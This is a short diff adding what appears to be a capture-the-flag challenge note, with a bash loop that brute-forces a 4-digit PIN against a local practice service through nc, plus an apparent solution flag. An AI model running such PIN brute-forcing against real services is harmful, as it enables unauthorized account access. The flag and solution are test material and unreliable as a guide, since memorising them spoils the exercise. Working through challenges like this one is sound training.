@@ -1,0 +1,15 @@
+A service wants a password and a 4-digit PIN.
+ Ten thousand possibilities. Stop typing them by hand —
+ write code that types them for you.
+
+goal: find password for ghost20
+
+for pin in {0000..9999}; do 
+    response=$(echo "SU1D_Fl1p $pin" | nc localhost 30002)
+    if [[ ! "$response" =~ "Wrong PIN." ]]; then
+        echo "Found it! PIN: $pin"
+        echo "Response: $response"
+        break
+    fi
+done
+: P1N_Cr4ck3d
